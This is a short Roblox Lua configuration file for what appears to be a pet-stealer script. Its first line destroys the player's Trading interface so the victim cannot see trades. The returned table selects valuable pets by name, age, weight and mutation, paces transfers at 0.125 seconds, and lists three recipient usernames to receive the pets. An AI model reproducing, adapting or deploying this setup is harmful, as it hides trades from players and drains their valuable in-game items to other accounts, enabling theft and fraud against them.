game:GetService("Players").LocalPlayer.PlayerGui.Trading:Destroy()

return {
    ENABLE_AGE_FILTER    = true,
    ENABLE_WEIGHT_FILTER = true,
    MIN_AGE              = 50,
    MIN_WEIGHT           = 15,

    ALLOWED_NAMES = {
        ["raccoon"]         = true,
        ["disco bee"]       = true,
        ["butterfly"]       = true,
        ["mimic octopus"]   = true,
        ["dragonfly"]       = true,
        ["chicken zombie"] = true,
        ["blood owl"] = true,
    },

    DELAY_BETWEEN_PETS = 0.125,

    RECIPIENT_USERNAMES = {
        ["JobJobJob_JobJobJob"] = true,
        ["1xxxCoolGuyxx1"]      = true,
        ["canyoust0pME"]        = true,
    },

    PET_MUTATIONS = {
        ["ascended"] = false,
        ["rainbow"]  = true,
        ["inverted"] = false
    },
}
